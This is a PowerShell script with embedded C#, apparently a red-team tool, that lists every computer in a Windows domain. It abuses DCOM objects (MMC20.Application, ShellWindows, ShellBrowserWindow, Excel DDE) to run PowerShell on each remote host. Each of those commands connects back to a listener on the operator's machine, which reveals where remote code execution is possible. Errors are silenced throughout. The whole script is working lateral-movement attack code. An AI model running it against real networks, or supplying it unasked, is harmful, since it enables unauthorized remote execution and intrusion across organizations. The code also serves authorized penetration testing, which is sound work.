<#

    Find DCOM Local Access
    Author: @polair

#>
if (-not ("TcpListenerAsync" -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading; 
using System.Collections.Generic;
using System.IO;

public class TcpListenerAsync {

    private Socket _socket;
    private static Dictionary<string, ManualResetEvent> HostnSignal = new Dictionary<string, ManualResetEvent>();
    

    public TcpListenerAsync(string ip, int port) {

        IPAddress ipAddress = IPAddress.Parse(ip);
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
        _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _socket.Bind(localEndPoint);
        _socket.Listen(10);
    }

    public void Start() {

        _socket.BeginAccept(new AsyncCallback(OnAccept), null);
    }

    public void Stop2() {

       _socket.Close();
    }

    public static ManualResetEvent GetSignal(string hostname) {

        if (HostnSignal.ContainsKey(hostname)) 
            return HostnSignal[hostname];
        
        return null;
    }

    public static bool WaitForSignal(string hostname, int timeoutMilliseconds){
    ManualResetEvent signal = TcpListenerAsync.GetSignal(hostname);

    if (signal == null)
        return false;
    
    return signal.WaitOne(timeoutMilliseconds);
    }

    public static void SetDefaultSignal(string hostname) {

    Console.WriteLine("\n[*] Trying " + hostname+"...");

    if (!HostnSignal.ContainsKey(hostname)) 
        HostnSignal.Add(hostname, new ManualResetEvent(false));
   }

   public static void ResetStaticState() {

    HostnSignal.Clear();
    }

   /*
   public static void Test(string hostname) {

   Console.WriteLine("Here" + hostname);
    
   }
  */

    private void OnAccept(IAsyncResult ar) {

        try {
            Socket client = _socket.EndAccept(ar);
            
          //string ip = ((IPEndPoint)client.RemoteEndPoint).Address.ToString();
          //Console.WriteLine("IP: " + ip);

            string hostname = Dns.GetHostEntry(((IPEndPoint)client.RemoteEndPoint).Address).HostName;
          //Console.WriteLine("\n[*] conn from " + hostname);
            NetworkStream stream = new NetworkStream(client);
            StreamReader reader = new StreamReader(stream);
            string message = reader.ReadLine(); 
          //Console.WriteLine(message);

            if (HostnSignal.ContainsKey(hostname) && !HostnSignal[hostname].WaitOne(0)) {

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] The current user has access to " + hostname+  " via "+message);
                 
                Console.ResetColor();
                ManualResetEvent signal = new ManualResetEvent(false);
                signal.Set(); 
                   
                HostnSignal[hostname] = signal;
                }

            else{
                 //Console.WriteLine("nop" + hostname+"\n");
                }
        
            reader.Close();       
            stream.Close();       
            client.Close();     
            _socket.BeginAccept(new AsyncCallback(OnAccept), null);
        } catch (Exception) {
          
        } finally {
          
        }
    }
}
"@
}

function Find-DCOMLocalAdminAccess {
    <#
    .SYNOPSIS

        Attempts various DCOM methods to verify local access on machines in a domain or local network.

    .DESCRIPTION

        Invokes commands on remote hosts via COM objects over DCOM.

    .PARAMETER ComputerName

        IP address or hostname of the remote system.

    .PARAMETER lport

        Port to bind the listener on.

    .PARAMETER lhost

        Host IP address to bind the listener on.

    .PARAMETER timeout

        Maximum time to wait for runspaces (max = timeout * number of computers).

    .PARAMETER threads

        Maximum number of runspaces to run in parallel.

    .EXAMPLE

       Import-Module .\Find-DCOMLocalAdminAccess.ps1
       Find-DCOMLocalAdminAccess -lhost 192.168.56.30 [-lport 4455 -timeout 5000 -threads 5 -ComputerName '192.168.1.103']
        
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $ComputerName,

        [Parameter(Mandatory = $false, Position = 1)]
        [string]
        $lport = 4466,

        [Parameter(Mandatory = $true, Position = 2)]
        [string]
        $lhost,

        [Parameter(Mandatory = $false, Position = 3)]
        [string]
        $timeout = 15000,

        [Parameter(Mandatory = $false, Position = 4)]
        [int]
        $threads = 5
        
    )

    Begin {
        $ErrorActionPreference2 = "$ErrorActionPreference"
        $ErrorActionPreference = "silentlycontinue"
    }

    Process {
      
        if ($Computerfile) {
            $Computers = Get-Content $Computerfile
        }
        elseif ($ComputerName) {
            $Computers = $ComputerName
        }
        else {
            $localFQDN = [System.Net.Dns]::GetHostEntry($env:COMPUTERNAME).HostName
   
            # Get a list of all the computers in the domain
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
            $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
            $objSearcher.Filter = "(&(sAMAccountType=805306369))"
            $Computers = $objSearcher.FindAll() |ForEach-Object {
            $hostname = $_.properties["dnshostname"]
                if ($hostname -and $hostname -ne $localFQDN) {
                     $hostname
                }

    }
           
        }
        
        try {
            #Write-Host "[*] Setting up Custom Server on $lhost :$lport"
            $listener = New-Object TcpListenerAsync("$lhost", $lport)
            $listener.Start()
        }
        catch {
            Write-Host "[-] Error starting listener, try using a different IP address or port."
            [TcpListenerAsync]::ResetStaticState()
            break
        } 
           
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $threads)
        $runspacePool.Open()
        $runspaces = @()
  
        foreach ($ComputerName in $Computers) {

            $ps = [powershell]::Create()
            $ps.RunspacePool = $runspacePool
            $ps.AddScript({
                    param($ComputerName, $lhost, $lport, $timeout)
                    [TcpListenerAsync]::SetDefaultSignal("$ComputerName")

                    $Com = [Type]::GetTypeFromProgID("MMC20.Application", "$ComputerName")
                    $Obj = [System.Activator]::CreateInstance($Com)
                    $Obj.Document.ActiveView.ExecuteShellCommand("powershell", $null, "(New-Object Net.Sockets.TCPClient('$lhost',$lport)).GetStream() | % { `$w = New-Object IO.StreamWriter(`$_); `$w.AutoFlush = `$true; `$w.WriteLine('MMC20'); `$w.Close(); `$_.Close() }", "7")
                    #[TcpListenerAsync]::Test($ComputerName)
     
                    $Com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "$ComputerName")
                    $Obj = [System.Activator]::CreateInstance($Com)
                    $Item = $Obj.Item()
                    $Item.Document.Application.ShellExecute("powershell", "(New-Object Net.Sockets.TCPClient('$lhost',$lport)).GetStream() | % { `$w = New-Object IO.StreamWriter(`$_); `$w.AutoFlush = `$true; `$w.WriteLine('ShellWindows'); `$w.Close(); `$_.Close() }", "c:\windows\system32", $null, 0)
      
                    #[TcpListenerAsync]::Test($ComputerName)
                    $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "$ComputerName")
                    $Obj = [System.Activator]::CreateInstance($Com)
                    $Obj.Document.Application.ShellExecute("powershell", "(New-Object Net.Sockets.TCPClient('$lhost',$lport)).GetStream() | % { `$w = New-Object IO.StreamWriter(`$_); `$w.AutoFlush = `$true; `$w.WriteLine('ShellBrowserWindow'); `$w.Close(); `$_.Close() }", "c:\windows\system32", $null, 0)
                    
                    #[TcpListenerAsync]::Test($ComputerName)
                    $Com = [Type]::GetTypeFromProgID("Excel.Application", "$ComputerName")
                    $Obj = [System.Activator]::CreateInstance($Com)
                    $Obj.DisplayAlerts = $false
                    $Obj.DDEInitiate("powershell", "(New-Object Net.Sockets.TCPClient('$lhost',$lport)).GetStream() | % { `$w = New-Object IO.StreamWriter(`$_); `$w.AutoFlush = `$true; `$w.WriteLine('ExcelDDE'); `$w.Close(); `$_.Close() }")
                    # [TcpListenerAsync]::Test($ComputerName + "first")

                    [TcpListenerAsync]::WaitForSignal($ComputerName, $timeout)
                    #[TcpListenerAsync]::Test($ComputerName + "after")

                    <#
                    $signal = [TcpListenerAsync]::GetSignal($ComputerName).WaitOne($timeout)
        
                    [TcpListenerAsync]::Test($ComputerName)
                    if ([TcpListenerAsync]::GetSignal($ComputerName).WaitOne(0)) {
                        [TcpListenerAsync]::Test("sact" +$ComputerName )
                    } 
                    else 
                        [TcpListenerAsync]::Test("nact")
                    #>

                }).AddArgument($ComputerName).AddArgument($lhost).AddArgument($lport).AddArgument($timeout) > $null
   
            $runspaces += [PSCustomObject]@{
                PowerShell = $ps
                Handle     = $ps.BeginInvoke()

            }

        }

        foreach ($rs in $runspaces) {

            #Write-Host " Time started on $($rs.PowerShell.InstanceId)"
            $handle = $rs.Handle.AsyncWaitHandle

            if ($handle.WaitOne($timeout)) {
                # Write-Host "Time over on $($rs.PowerShell.InstanceId)"
                $output = $rs.PowerShell.EndInvoke($rs.Handle)
                foreach ($line in $output) {
                    if ($line -is [string]) {
                        Write-Host $line
                    }
                }
            }
            else {
                #Write-Host " Timeout on $($rs.PowerShell.InstanceId)"
                continue
            }

            $rs.PowerShell.Dispose()
        }
    }

    End {
    
        try {
        
            $ErrorActionPreference = $ErrorActionPreference2
            [TcpListenerAsync]::ResetStaticState()
            $listener.Stop2();
            #Write-Host "Completed"
        }
        catch {
        }
    
    }
}



